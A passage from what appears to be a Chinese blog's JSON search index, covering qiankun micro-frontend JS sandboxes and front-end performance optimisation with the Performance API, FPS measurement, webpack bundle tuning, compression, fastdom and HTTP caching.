SnapshotSandbox {    constructor() {        this.proxy &#x3D; window;         this.modifyPropsMap &#x3D; {}; &#x2F;&#x2F; 修改了哪些属性        this.active();    }    active() {        this.windowSnapshot &#x3D; {}; &#x2F;&#x2F; window对象的快照        for (const prop in window) {            if (window.hasOwnProperty(prop)) {                &#x2F;&#x2F; 将window上的属性进行拍照                this.windowSnapshot[prop] &#x3D; window[prop];            }        }        Object.keys(this.modifyPropsMap).forEach(p &#x3D;&gt; {            window[p] &#x3D; this.modifyPropsMap[p];        });    }    inactive() {        for (const prop in window) { &#x2F;&#x2F; diff 差异            if (window.hasOwnProperty(prop)) {                &#x2F;&#x2F; 将上次拍照的结果和本次window属性做对比                if (window[prop] !&#x3D;&#x3D; this.windowSnapshot[prop]) {                    &#x2F;&#x2F; 保存修改后的结果                    this.modifyPropsMap[prop] &#x3D; window[prop];                     &#x2F;&#x2F; 还原window                    window[prop] &#x3D; this.windowSnapshot[prop];                 }            }        }    }}let sandbox &#x3D; new SnapshotSandbox();((window) &#x3D;&gt; {    window.a &#x3D; 1;    window.b &#x3D; 2;    window.c &#x3D; 3    console.log(a,b,c)    sandbox.inactive();    console.log(a,b,c)})(sandbox.proxy);快照沙箱只能针对单实例应用场景，如果是多个实例同时挂载的情况则无法解决，这时只能通过Proxy代理沙箱来实现\n2.Proxy 代理沙箱class ProxySandbox {    constructor() {        const rawWindow &#x3D; window;        const fakeWindow &#x3D; {}        const proxy &#x3D; new Proxy(fakeWindow, {            set(target, p, value) {                target[p] &#x3D; value;                return true            },            get(target, p) {                return target[p] || rawWindow[p];            }        });        this.proxy &#x3D; proxy    }}let sandbox1 &#x3D; new ProxySandbox();let sandbox2 &#x3D; new ProxySandbox();window.a &#x3D; 1;((window) &#x3D;&gt; {    window.a &#x3D; ‘hello’;    console.log(window.a)})(sandbox1.proxy);((window) &#x3D;&gt; {    window.a &#x3D; ‘world’;    console.log(window.a)})(sandbox2.proxy);每个应用都创建一个proxy来代理window对象，好处是每个应用都是相对独立的，不需要直接更改全局的window属性。\n","categories":["微前端"],"tags":["qiankun"]},{"title":"前端性能优化-02","url":"/2021/03/02/%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/02%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96%E6%A8%A1%E5%9E%8BRAIL%E6%B5%8B%E9%87%8F/","content":"什么是RAIL：缩写每一个字母表示一个性能指标\nResponse：响应  对用户而言用户点击有没有即使访问\nAnimation：动画 给用户的体验好。会不会出现卡顿\nIdie：空闲 有足够的空闲时间才能够进行响应交互   不让他始终处于繁忙的时间，不然无法处理其他请求\n\nLoad：加载 资源网络加载的时间\nRAIL目标\n评估指标\n响应：处理时间应在50ms以内完成\n动画：没10ms产生一帧\n空闲：尽可能增加空闲时间\n加载：在5s内完成内容加载并可以交互\n逐步发现问题解决问题\n性能测量工具\nChrome DevTools 开发者调试工具，性能评测\nLighthouse 网站整体质量评估\nWebPageTest 多测量地点、全面行能报告（通过 它的问斩对自己的网站就行进行评估）\nWenPageTestwebpagetest.org\n\n用户首次方位  第二次访问  （第一次对一些静态资源做缓存）\n录视频\n\n测试结果：\n\n第一次加载，首屏渲染，\nspeed 速度指数等\n图片并行加载  时间有加载最长时间决定\n\n高亮（重定向了）  可以优化  直接去访问重定向后的位置\n\n\n前提：docker\ndocker pull webpagetest&#x2F;server\ndocker pull webpagetest&#x2F;a\ndocker run -d -p 4000:80 webpagetest&#x2F;server\n\n自定义镜像\n\n\n\n\n\n打包\n\n\n这样就可以本地测试了。\nLighthousenpm install -g lighthouse\nlighthouse 测试网站地址\n自动打开一个浏览器窗口\n生成而是报告到本地\n打开即可查看\n\n第一个有意义的内容\n什么时候用户可以交互了\n用户访问过程截屏。\nOpportunity：告诉我们还可以做些什么做到了可以提升那些多长时间\n\n\n可以指定什么样的资源不进行加载。\nChrome devtool调试Network：\n资源名称  大小   耗时\n\n对请求资源进行压缩在返回前端\n\n实际大小 parse  1.4MB   网络传输（index）55kb\nPerformance：\n开始出现性能分析：可以定位出导致长任务（耗费时间长）的方法。\n\n主线程任务。\nDisabel cache缓存。 Online：选择网络\n\n\n\n","categories":["前端性能优化"],"tags":["优化"]},{"title":"前端性能优化-03","url":"/2021/03/09/%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/03%E6%80%A7%E8%83%BD%E6%B5%8B%E9%87%8FAPI%EF%BC%88web%E6%8F%90%E4%BE%9B%EF%BC%8C%E5%8A%A8%E6%80%81%E6%B5%8B%E9%87%8F%EF%BC%89/","content":"Web Api\n\n\n页面渲染原理\n\n\n浏览器解释器  将他们翻译成浏览器认识的形式。\n\n\n\n回流\n里纳西不断的回流：\n\n\nfastdom批量对DOM的读写操作     先执行读操作  后执行写操作\n强制布局：很卡顿（连续的强制读写更新） 但是使用了fastdom(读写分离)后执行就会流畅\n\n\n复合线程与图层\n在控制太我们通过frame就可以查看对应图层\n这些不会触发布局和重绘，只会触发复合的过程给他们一个图层\n\n查看图层：\n\n查看交互点击第一个录制，然后停止就可以查看\n第二个刷新只页面重新加载  。\n\n图层越多 开销也会越大。\n减少重绘\nrender：选中第一个它会告诉我们谁会重绘并且标问绿色\n\n\n高频事件处理函数 防抖\n\n事件触发  js  触发视觉变换   1帧开始    raf在  之前进行布局和绘制，\n\n\n","categories":["前端性能优化"],"tags":["优化"]},{"title":"前端性能优化-01","url":"/2021/02/26/%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/01%E9%A1%B9%E7%9B%AE%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96%E6%A6%82%E8%BF%B0/","content":"平凡程序员和大牛程序员、架构师的分水岭\n怎样做出高性能的工程，达到大厂产品水平\n只是储配，动手实战\n\n优化标准“\n\n学习体系\n\n\n一、为什么要进行性能优化\n性能-web网站和应用的支柱\n网站性能对用户很重要\n\n寻找性能瓶颈\n\n\n性能指标和性能优化\n性能指标：\nNetwork  (页面清空缓存 ，重新加载，查看)\n请求数量  资源量   Dom加载时间   混合资源加载时间\n\n瀑布图：\n请求前资源排队，dns解析，连接，SSL协商\n发送：TTFB（用户体验和他有大多数关系）   下载（资源大小）  资源进行并行加载（不阻塞）\n\n\n右键下载查看  进行性能分析\n\n性能测量工具：\n\nfirst C …：页面出现数据的时间\nSpeed Index：速度指数（标准为4s）\n\n交互性：\n画面流畅（帧数问题）\n查看查看帧数变化工具：最后一项\n\n\n\n\n","categories":["前端性能优化"],"tags":["优化"]},{"title":"前端性能优化-Performance以及动画帧数","url":"/2021/03/16/%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/%E5%89%8D%E7%AB%AF%E6%80%A7%E8%83%BD%E4%B9%8BPerformance%E4%BB%A5%E5%8F%8A%E5%8A%A8%E7%94%BB%E5%B8%A7%E7%8E%87(FPS)/","content":"\nPerformance是一个做前端性能监控离不开的API，最好在页面完全加载完成之后再使用，因为很多值必须在页面完全加载之后才能得到。最简单的办法是在window.onload事件中读取各种数据。\n\n一、回顾页面加载过程\n要学习这套API的使用，先简单介绍下前端的基础知识\n\n1.1 页面加载\n一个页面的请求到响应再到显示出来，需要经过下面一些重要过程，当我们在浏览器输入一个URL或者说点击一个URL开始，会出现如下流程\n\n\n页面准备\n重定向：在header定义了重定向才会有这个过程，如果没有重定向，不会产生这个过程。\napp cache：会先检查这个域名是否有缓存，如果有缓存就不需要DNS解析域名。这里的app是值应用程序application，不指手机app。\nDNS解析：把域名解析成IP，如果直接用ip地址访问，不产生这个过程。\nTCP连接：http协议是经过TCP来传输的，所以产生一个http请求就会有TCP connect，但是依赖于长连接，不会产生这个过程。\nrequest header：请求头信息。\nrequest body：请求体信息，比如get请求是没有请求体信息的，所以没有这个过程，这就是为什么把头跟体分开写的原因。\nresponse header：响应头信息。\nresponse body：响应体信息。\n解析HTML结构\n加载外部脚本和样式表文件：正常来说JS、css都是外部加载的，当然有不正常的人啊，比如我。\n解析并执行脚本代码\n构建与解析HTML DOM树：这个过程可以去了解下DOM树是怎样的就明白啦。\n加载外部图片\n页面加载完成，显示出来啦\n\n1.2 重定向分析\napp cach\nDNS解析\nTCP连接\nrequest header\n重定向\napp cach\nDNS解析\nTCP连接\nrequest header\n\n二、performance2.1 performance.timing\n这个API能帮我们得到整个页面请求的时间，如下图，在Chrome的Console是可以直接运行的\n\n\n先解释下这些时间都是代表什么\ntiming 对象里边的数据比较多，梳理如下几个关键性的节点\n\nfetchStart：发起获取当前文档的时间点，我的理解是浏览器收到发起页面请求的时间点；\ndomainLookupStart：返回浏览器开始DNS查询的时间，如果此请求没有DNS查询过程，如长连接、资源cache、甚至是本地资源等，那么就返回fetchStart的值；\ndomainLookupEnd：返回浏览器结束DNS查询的时间，如果没有DNS查询过程，同上；\nconnectStart：浏览器向服务器请求文档，开始建立连接的时间，如果此连接是一个长连接，或者无需与服务器连接（命中缓存），则返回domainLookupEnd的值；\nconnectEnd：浏览器向服务器请求文档，建立连接成功的时间；\nrequestStart：开始请求文档的时间（注意没有requestEnd）;\nresponseStart：浏览器开始接收第一个字节数据的时间，数据可能来自于服务器、缓存、或本地资源；\nunloadEventStart：卸载上一个文档开始的时间；\nunloadEventEnd：卸载上一个文档结束的时间；\ndomLoading：浏览器把document.readyState设置为“loading”的时间点，开始构建dom树的时间点；\nresponseEnd：浏览器接收最后一个字节数据的时间，或连接被关闭的时间；\ndomInteractive：浏览器把document.readyState设置为“interactive”的时间点，DOM树创建结束；\ndomContentLoadedEventStart：文档发生DOMContentLoaded事件的时间；\ndomContentLoadedEventEnd：文档的DOMContentLoaded事件结束的时间；\ndomComplete：浏览器把document.readyState设置为“complete”的时间点；\nloadEventStart：文档触发load事件的时间；\nloadEventEnd：文档出发load事件结束后的时间\n\n\n再来一张图，表示各阶段的开始与结束对应的时间\n\n\n\n从以上的分析，我们就可以得到一些时间的计算\n\n\n准备新页面耗时：fetchStart - navigationStart\n重定向时间：redirectEnd - redirectStart\nApp Cache时间：domainLookupStart - fetchStart\nDNS解析时间：domainLookupEnd -domainLookupStart\nTCP连接时间：connectEnd - connectStart\nrequest时间：responseEnd - requestStart这个计算是代表请求响应加起来的时间\n请求完毕到DOM树加载：domInteractive -responseEnd\n构建与解析DOM树，加载资源时间：domCompleter -domInteractive\nload时间：loadEventEnd - loadEventStart\n整个页面加载时间：loadEventEnd -navigationStart\n白屏时间：responseStart-navigationStart\n\n2.2 performance.getEntries()\n这个API能帮我们获得资源的请求时间，包括JS、CSS、图片等\n\n\n\n如上图可以看到这个API请求返回的是一个数组，这个数组包括整个页面所有的资源加载，上图打开了一个其中一个资源，可以看到如下信息\n\n\nentryType：类型为resource\nname：资源的url\ninitiatorType：资源是link\n资源时间：duration的值，是responseEnd - startTime得到的\n\n2.3 performance.memory\n这个API主要是得到浏览器内存情况\n\n\njsHeapSizeLimit：内存大小限制\ntotalJSHeapSize：可使用的内容\nuserdJSHeapSize：已使用的内容\n\n\nuserdJSHeapSize表示所有被使用的JS堆栈内存，totalJSHeapSize可使用的JS堆栈内存，如果userdJSHeapSize的值大于totalJSHeapSize，就可能出现内存泄漏\n\n\n三、动画帧率FPS3.1 流畅动画的标准\nFPS 表示的是每秒钟画面更新次数。我们平时所看到的连续画面都是由一幅幅静止画面组成的，每幅画面称为一帧，FPS 是描述“帧”变化速度的物理量\n\n\n理论上说，FPS 越高，动画会越流畅，目前大多数设备的屏幕刷新率为 60 次&#x2F;秒，所以通常来讲 FPS 为 60 frame/s 时动画效果最好，也就是每帧的消耗时间为 16.67ms\n\n不同帧率的体验\n\n帧率能够达到 50 ～ 60 FPS 的动画将会相当流畅，让人倍感舒适；\n帧率在 30 ～ 50 FPS 之间的动画，因各人敏感程度不同，舒适度因人而异；\n帧率在 30 FPS 以下的动画，让人感觉到明显的卡顿和不适感；\n帧率波动很大的动画，亦会使人感觉到卡顿\n\n3.2 获取我们页面动画当前的 FPS 值\n那么我们该如何准确的获取我们页面动画当前的 FPS 值呢？\n\n3.2.1 方法一 借助 Chrome 开发者工具\nChrome 提供给开发者的功能十分强大，在开发者工具中，我们进行如下选择调出 FPS meter 选项：\n\n\n\n通过这个按钮，可以开启页面实时 Frame Rate (帧率) 观测及页面 GPU 使用率\n\n但是这个方法缺点太多了\n\n这个只能一次观测一到几个页面，而且需要人工实时观测\n数据只能是主观感受，并没有一个十分精确的数据不断上报或者被收集\n因此，我们需要更加智能的方法。\n\n3.2.2 方法二 借助 Frame Timing API\nBlink 内核早期架构\n\n\n以 Chrome 浏览器内核 Blink 渲染页面为例。对早期的 Chrome 浏览器而言，每个页面 Tab 对应一个独立的 renderer 进程，Renderer进程中包含了主线程和合成线程。早期 Chrome 内核架构\n\n\n其中，主线程主要负责：\n\nJavascript 的计算与执行\nCSS 样式计算\nLayout 计算\n将页面元素绘制成位图（paint），也就是光栅化（Raster）\n将位图给合成线程\n\n合成线程则主要负责：\n\n将位图(GraphicsLayer 层)以纹理(texture)的形式上传给 GPU\n计算页面的可见部分和即将可见部分（滚动）\nCSS 动画处理\n通知 GPU 绘制位图到屏幕上\n\n\n其实知道了这两个线程之后，下一个概念是厘清 CSS 动画与 JS 动画的细微区别（当然它们都是 Web 动画）\n\nJS 动画与 CSS 动画的细微区别\n\n对于 JS动画而言，它们运行时的帧率即是主线程和合成线程加起来消耗的时间。对于流畅动画而言，我们希望它们每一帧的耗时保持在 16.67ms 之内;\n而对于 CSS 动画而言，由于其流程不受主线程的影响，所以希望能得到合成线程的消耗的时间，而合成线程的绘制频率也反映了滚动和 CSS 动画的流程性。\n\n\n上面主要想得出的一个结论是。如果我们能够知道主线程和合成线程每一帧消耗的时间，那么我们就能大致得出对应的 Web 动画的帧率。那么上面说到的 Frame Timing API 是否可以帮助我们拿到这个时间点呢\n\n什么是 Frame Timing API ？\n\nFrame Timing API 是 Web Performance Timing API 标准中的其中一位成员。Web Performance Timing API 是 W3C 推出的一套性能 API 标准，用于帮助开发者对网站各方面的性能进行精确的分析与控制，提升 Web 网站性能\n\n它包含许多子类 API，完成不同的功能，大致如下\n\n怎么使用呢？以 Navigation Timing, Performance Timeline, Resource Timing 为例子，对于兼容它的浏览器，它以只读属性的形式对外暴露挂载在 window.performance 上。\n我们再来回顾这张图\n\n\n通过这张图以及上面的 window.performance.timing，我们就可以轻松的统计出页面每个重要节点的耗时，这就是 Web Performance Timing API 的强大之处，感兴趣的可以详细去研究研究，使用在页面统计上\n\nFrame Timing API 示意\n\n终于可以回归正题，借助 Web Performance Timing API 中的Frame Timing API，可以轻松的拿到每一帧中，主线程以及合成线程的时间。或者更加容易，直接拿到每一帧的耗时\n\n获取 Render 主线程和合成线程的记录，每条记录包含的信息基本如下\nvar rendererEvents = window.performance.getEntriesByType(&quot;renderer&quot;);var compositeThreadEvents = window.performance.getEntriesByType(&quot;composite&quot;);\n\n或者是：\nar observer = new PerformanceObserver(function(list) &#123;    var perfEntries = list.getEntries();    for (var i = 0; i &lt; perfEntries.length; i++) &#123;        console.log(&quot;frame: &quot;, perfEntries[i]);    &#125;&#125;); // subscribe to Frame Timingobserver.observe(&#123;entryTypes: [&#x27;frame&#x27;]&#125;);\n\n每条记录包含的信息基本如下：\n&#123;  sourceFrameNumber: 120,  startTime: 1342.549374253  cpuTime: 6.454313323&#125;\n\n\n每个记录都包括唯一的 Frame Number、Frame 开始时间以及 cpuTime 时间。通过计算每一条记录的 startTime ，我们就可以算出每两帧间的间隔，从而得到动画的帧率是否能够达到 60 FPS\n\n看看 Web Performance Timing API 整体的兼容性\n\n\nFrame Timing API 虽好，但是，现在 Frame Timing API 的兼容性不算很友好，额，不友好到什么程度呢。还没有任何浏览器支持，处于实验性阶段，属于面向未来编程\n\n3.2.3 方法三 借助 requestAnimationFrame API\n从上面的介绍，我们得知，如果我们可以到得到每一帧中的固定一个时间点，那么两者相减，也能够近似得到一帧所消耗的时间\n\n这次，我们借助兼容性不错的 requestAnimationFrame API\n// 语法window.requestAnimationFrame(callback);\n\n\nrequestAnimationFrame 大家应该都不陌生，方法告诉浏览器您希望执行动画并请求浏览器调用指定的函数在下一次重绘之前更新动画。\n当你准备好更新屏幕画面时你就应用此方法。这会要求你的动画函数在浏览器下次重绘前执行。回调的次数常是每秒 60 次，大多数浏览器通常匹配 W3C 所建议的刷新率\n\n使用 requestAnimationFrame 计算 FPS 原理\n\n原理是，正常而言 requestAnimationFrame 这个方法在一秒内会执行 60 次，也就是不掉帧的情况下。假设动画在时间 A 开始执行，在时间 B 结束，耗时 x ms。而中间 requestAnimationFrame 一共执行了 n 次，则此段动画的帧率大致为：n / (B - A)\n\n核心代码如下，能近似计算每秒页面帧率，以及我们额外记录一个 allFrameCount，用于记录 rAF 的执行次数，用于计算每次动画的帧率 ：\nvar rAF = function () &#123;    return (        window.requestAnimationFrame ||        window.webkitRequestAnimationFrame ||        function (callback) &#123;            window.setTimeout(callback, 1000 / 60);        &#125;    );&#125;();  var frame = 0;var allFrameCount = 0;var lastTime = Date.now();var lastFameTime = Date.now();  var loop = function () &#123;    var now = Date.now();    var fs = (now - lastFameTime);    var fps = Math.round(1000 / fs);      lastFameTime = now;    // 不置 0，在动画的开头及结尾记录此值的差值算出 FPS    allFrameCount++;    frame++;      if (now &gt; 1000 + lastTime) &#123;        var fps = Math.round((frame * 1000) / (now - lastTime));        console.log(`$&#123;new Date()&#125; 1S内 FPS：`, fps);        frame = 0;        lastTime = now;    &#125;;      rAF(loop);&#125; loop();\n\n寻找一个有动画不断运行的页面进行测试，可以看到代码运行如下：\n\n\n使用了我之前制作的一个页面进行了测试，使用Chrome 同时调出页面的 FPS meter，对比两边的实时 FPS值，基本吻合。\n测试页面，Solar System。你可以将上面的代码贴到这个页面的 console 中，测试一下数据\n\n\n\n对比右上角的 Frame Rate，帧率基本一致。在大部分情况下，这种方法可以很好的得出 Web 动画的帧率。\n如果我们需要统计某个特定动画过程的帧率，只需要在动画开始和结尾两处分别记录 allFrameCount 这个数值大小，再除以中间消耗的时间，也可以得出特定动画过程的 FPS 值。\n值得注意的是，这个方法计算的结果和真实的帧率肯定是存在误差的，因为它是将每两次主线程执行 javascript的时间间隔当成一帧，而非上面说的主线程加合成线程所消耗的时间为一帧。但是对于现阶段而言，算是一种可取的方法\n\n","categories":["前端性能优化"],"tags":["优化"]},{"title":"前端页面性能优化","url":"/2021/03/22/%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/%E5%89%8D%E7%AB%AF%E9%A1%B5%E9%9D%A2%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/","content":"一、调试工具1、Network\n这里可以看到资源加载详情，初步评估影响页面性能的因素。鼠标右键可以自定义选项卡，页面底部是当前加载资源的一个概览。DOMContentLoaded DOM渲染完成的时间，Load：当前页面所有资源加载完成的时间\n思考：如何判断哪些资源对当前页面加载无用，做对应优化？\nshift + cmd + P 调出控制台的扩展工具，添加规则\n\n监控页面性能变化\n\n瀑布流waterfal\n\nQueueing 浏览器将资源放入队列时间\nStalled 因放入队列时间而发生的停滞时间\nDNS Lookup DNS解析时间\nInitial connection 建立HTTP连接的时间\nSSL 浏览器与服务器建立安全性连接的时间\nTTFB 等待服务端返回数据的时间\nContent Download 浏览器下载资源的时间\n\n2、Lighthouse\n\nFirst Contentful Paint 首屏渲染时间，1s以内绿色\nSpeed Index 速度指数，4s以内绿色\nTime to Interactive 到页面可交换的时间\n\n\n根据chrome的一些策略自动对网站做一个质量评估，并且会给出一些优化的建议\n\n3、Peformance\n对网站最专业的分析\n4、webPageTest\n可以模拟不同场景下访问的情况，比如模拟不同浏览器、不同国家等等，在线测试地址：webPageTest\n\n\n\n5、资源打包分析webpack-bundle-analyzer\nnpm install --save-dev webpack-bundle-analyzer// webpack.config.js 文件const BundleAnalyzerPlugin = require(&#x27;webpack-bundle-analyzer&#x27;).BundleAnalyzerPluginmodule.exports=&#123;  plugins: [    new BundleAnalyzerPlugin(&#123;          analyzerMode: &#x27;server&#x27;,          analyzerHost: &#x27;127.0.0.1&#x27;,          analyzerPort: 8889,          reportFilename: &#x27;report.html&#x27;,          defaultSizes: &#x27;parsed&#x27;,          openAnalyzer: true,          generateStatsFile: false,          statsFilename: &#x27;stats.json&#x27;,          statsOptions: null,          logLevel: &#x27;info&#x27;        &#125;),  ]&#125;// package.json&quot;analyz&quot;: &quot;NODE_ENV=production npm_config_report=true npm run build&quot;\n\n开启source-map\nwebpack.config.js\n\nmodule.exports = &#123;    mode: &#x27;production&#x27;,    devtool: &#x27;hidden-source-map&#x27;,&#125;\n\npackage.json\n&quot;analyze&quot;: &quot;source-map-explorer &#x27;build/*.js&#x27;&quot;,\n\nnpm run analyze\n\n二、WEB API工欲善其事，必先利其器。浏览器提供的一些分析API至关重要\n1、监听视窗激活状态\n// 窗口激活状态监听let vEvent = &#x27;visibilitychange&#x27;;if (document.webkitHidden != undefined) &#123;    vEvent = &#x27;webkitvisibilitychange&#x27;;&#125;function visibilityChanged() &#123;    if (document.hidden || document.webkitHidden) &#123;        document.title = &#x27;客官，别走啊~&#x27;        console.log(&quot;Web page is hidden.&quot;)    &#125; else &#123;        document.title = &#x27;客官，你又回来了呢~&#x27;        console.log(&quot;Web page is visible.&quot;)    &#125;&#125;document.addEventListener(vEvent, visibilityChanged, false);\n\n其实有很多隐藏的api，这里大家有兴趣的可以去试试看：\n2、观察长任务（performance 中Task）const observer = new PerformanceObserver((list) =&gt; &#123;    for (const entry of list.getEntries()) &#123;        console.log(entry)    &#125;&#125;)observer.observe(&#123;entryTypes: [&#x27;longtask&#x27;]&#125;)\n\n3、监听网络变化网络变化时给用户反馈网络问题，有时候看直播的时候自己的网络卡顿，直播平台也会提醒你或者自动给你切换清晰度\nvar connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;var type = connection.effectiveType;function updateConnectionStatus() &#123;  console.log(&quot;Connection type changed from &quot; + type + &quot; to &quot; + connection.effectiveType);  type = connection.effectiveType;&#125;connection.addEventListener(&#x27;change&#x27;, updateConnectionStatus);\n\n4、计算DOMContentLoaded时间window.addEventListener(&#x27;DOMContentLoaded&#x27;, (event) =&gt; &#123;    let timing = performance.getEntriesByType(&#x27;navigation&#x27;)[0];    console.log(timing.domInteractive);    console.log(timing.fetchStart);    let diff = timing.domInteractive - timing.fetchStart;    console.log(&quot;TTI: &quot; + diff);&#125;)\n\n5、更多计算规则\nDNS 解析耗时: domainLookupEnd - domainLookupStart\nTCP 连接耗时: connectEnd - connectStart\nSSL 安全连接耗时: connectEnd - secureConnectionStart\n网络请求耗时 (TTFB): responseStart - requestStart\n数据传输耗时: responseEnd - responseStart\nDOM 解析耗时: domInteractive - responseEnd\n资源加载耗时:loadEventStart - domContentLoadedEventEnd\nFirst Byte时间: responseStart - domainLookupStart\n白屏时间: responseEnd - fetchStart\n首次可交互时间: domInteractive - fetchStart\nDOM Ready 时间: domContentLoadEventEnd - fetchStart\n页面完全加载时间: loadEventStart - fetchStart\nhttp 头部大小： transferSize - encodedBodySize\n重定向次数：performance.navigation.redirectCount\n重定向耗时: redirectEnd - redirectStart\n\n三、雅虎军规关于雅虎军规，你知道的有多少条，平时写用到的又有哪些？针对以下规则，我们可以做很多优化工作\n\n1、减少cookie传输\ncookie传输会造成带宽浪费，可以：\n\n\n减少cookie中存储的东西\n静态资源不需要cookie，可以采用其他的域名，不会主动带上cookie\n\n2、避免过多的回流与重绘连续触发页面回流操作\nlet cards = document.getElementsByClassName(&quot;MuiPaper-rounded&quot;);const update = (timestamp) =&gt; &#123;  for (let i = 0; i &lt;cards.length; i++) &#123;    let top = cards[i].offsetTop;    cards[i].style.width = ((Math.sin(cards[i].offsetTop + timestamp / 100 + 1) * 500) + &#x27;px&#x27;)  &#125;  window.requestAnimationFrame(update)&#125;update(1000);\n\n看下效果，很明显的卡顿\n\n\nperformance分析结果，load事件之后存在大量的回流，并且chrome都给标记了红色\n\n\n\n使用fastDom进行优化，将对dom的读和写分离，合并\n\nlet cards = document.getElementsByClassName(&quot;MuiPaper-rounded&quot;);  const update = (timestamp) =&gt; &#123;    for (let i = 0; i &lt; cards.length; i++) &#123;      fastdom.measure(() =&gt; &#123;        let top = cards[i].offsetTop;        fastdom.mutate(() =&gt; &#123;          cards[i].style.width =            Math.sin(top + timestamp / 100 + 1) * 500 + &quot;px&quot;;        &#125;);      &#125;);    &#125;    window.requestAnimationFrame(update)  &#125;  update(1000);\n\n\n\nperformance分析结果，load事件之后也没有了那么多的红色标记\n\n感兴趣的可以去了解一下fastDom：github fastdom 在线预览：fastdom demo\n关于任务拆分与组合的思想，react fiber架构做的很牛逼，有兴趣的可以去了解一下调度算法在fiber中的实践\n四、压缩1、Gzip开启方式可参考：nginx开启gzip\n\n\n还有一种方式：打包的时候生成gz文件，上传到服务器端，这样就不需要nginx来压缩了，可以降低服务器压力。 可参考：gzip压缩文件&amp;webPack配置Compression-webpack-plugin\n\n2、服务端压缩server.js\nconst express = require(&#x27;express&#x27;);const app = express();const fs = require(&#x27;fs&#x27;);const compression = require(&#x27;compression&#x27;);const path = require(&#x27;path&#x27;);app.use(compression());app.use(express.static(&#x27;build&#x27;));app.get(&#x27;*&#x27;, (req,res) =&gt;&#123;    res.sendFile(path.join(__dirname+&#x27;/build/index.html&#x27;));&#125;);const listener = app.listen(process.env.PORT || 3000, function () &#123;    console.log(`Listening on port $&#123;listener.address().port&#125;`);&#125;);\n\npackage.json\n&quot;start&quot;: &quot;npm run build &amp;&amp; node server.js&quot;,\n\n\n3、JavaScript、Css、Html压缩工程化项目中直接使用对应的插件即可，webpack的主要有下面三个：\n\nUglifyJS\nwebpack-parallel-uglify-plugin\nterser-webpack-plugin\n\n\n具体优缺点可参考：webpack常用的三种JS压缩插件。压缩原理简单的讲就是去除一些空格、换行、注释，借助es6模块化的功能，做了一些tree-shaking的优化。同时做了一些代码混淆，一方面是为了更小的体积，另一方面也是为了源码的安全性。\n\ncss压缩主要是mini-css-extract-plugin，当然前面的js压缩插件也会给你做好css压缩。使用姿势\nnpm install --save-dev mini-css-extract-pluginconst MiniCssExtractPlugin = require(&quot;mini-css-extract-plugin&quot;);plugins:[ new MiniCssExtractPlugin(&#123;       filename: &quot;[name].css&quot;,       chunkFilename: &quot;[id].css&quot;   &#125;)]\n\nhtml压缩可以用HtmlWebpackPlugin，单页项目就一个index.html,性能提升微乎其微~\n4、http2首部压缩http2的特点\n\n二进制分帧\n首部压缩\n流量控制\n多路复用\n请求优先级\n服务器推送http2_push: &#39;xxx.jpg&#39;\n\n具体升级方式也很简单，修改一下nginx配置，方法请自行Google\n五、webpack优化上文中也提到了部分webpack插件，下面我再来看看还有哪些~\n1、DllPlugin 提升构建速度\n通过DllPlugin插件，将一些比较大的，基本很少升级的包拆分出来，生成xx.dll.js文件,通过manifest.json引用\n\nwebpack.dll.config.js\nconst path = require(&quot;path&quot;);const webpack = require(&quot;webpack&quot;);module.exports = &#123;    mode: &quot;production&quot;,    entry: &#123;        react: [&quot;react&quot;, &quot;react-dom&quot;],    &#125;,    output: &#123;        filename: &quot;[name].dll.js&quot;,        path: path.resolve(__dirname, &quot;dll&quot;),        library: &quot;[name]&quot;    &#125;,    plugins: [        new webpack.DllPlugin(&#123;            name: &quot;[name]&quot;,            path: path.resolve(__dirname, &quot;dll/[name].manifest.json&quot;)        &#125;)    ]&#125;;\n\npackage.json\n&quot;scripts&quot;: &#123;    &quot;dll-build&quot;: &quot;NODE_ENV=production webpack --config webpack.dll.config.js&quot;,  &#125;,\n\n\nwebpack4不需要配置dll了，因为webpack4打包性能已经足够优化，vue-cli3都已经移除dll\n\n2、splitChunks 拆包optimization: &#123;        splitChunks: &#123;            cacheGroups: &#123;                vendor: &#123;                    name: &#x27;vendor&#x27;,                    test: /[\\\\/]node_modules[\\\\/]/,                    minSize: 0,                    minChunks: 1,                    priority: 10,                    chunks: &#x27;initial&#x27;                &#125;,                common: &#123;                    name: &#x27;common&#x27;,                    test: /[\\\\/]src[\\\\/]/,                    chunks: &#x27;all&#x27;,                    minSize: 0,                    minChunks: 2                &#125;            &#125;        &#125;    &#125;,\n\n六、骨架屏\n用css提前占好位置，当资源加载完成即可填充，减少页面的回流与重绘，同时还能给用户最直接的反馈。 图中使用插件：react-placeholder\n\n\n关于实现骨架屏还有很多种方案，用Puppeteer服务端渲染的挺多的\n使用css伪类：只要css就能实现的骨架屏方案\n七、窗口化\n原理：只加载当前窗口能显示的DOM元素，当视图变化时，删除隐藏的，添加要显示的DOM就可以保证页面上存在的dom元素数量永远不多，页面就不会卡顿\n\n图中使用的插件：react-window\n\n安装：npm i react-window\n引入：import &#123; FixedSizeList as List &#125; from &#39;react-window&#39;;\n使用：\nconst Row = (&#123; index, style &#125;) =&gt; (  &lt;div style=&#123;style&#125;&gt;Row &#123;index&#125;&lt;/div&gt;); const Example = () =&gt; (  &lt;List    height=&#123;150&#125;    itemCount=&#123;1000&#125;    itemSize=&#123;35&#125;    width=&#123;300&#125;  &gt;    &#123;Row&#125;  &lt;/List&gt;);\n\n八、缓存1、http缓存keep-alive判断是否开启：看response headers中有没有Connection: keep-alive 。开启以后，看network的瀑布流中就没有 Initial connection耗时了\nnginx设置keep-alive（默认开启）\n# 0 为关闭#keepalive_timeout 0;# 65s无连接 关闭keepalive_timeout 65;# 连接数，达到100断开keepalive_requests 100;\n\nCache-Control &#x2F; Expires &#x2F; Max-Age设置资源是否缓存，以及缓存时间\nEtag &#x2F; If-None-Match资源唯一标识作对比，如果有变化，从服务器拉取资源。如果没变化则取缓存资源，状态码304，也就是协商缓存\nLast-Modified &#x2F; If-Modified-Since通过对比时间的差异来觉得要不要从服务器获取资源\n更多HTTP缓存参数可参考：使用 HTTP 缓存：Etag, Last-Modified 与 Cache-Control\n2、Service 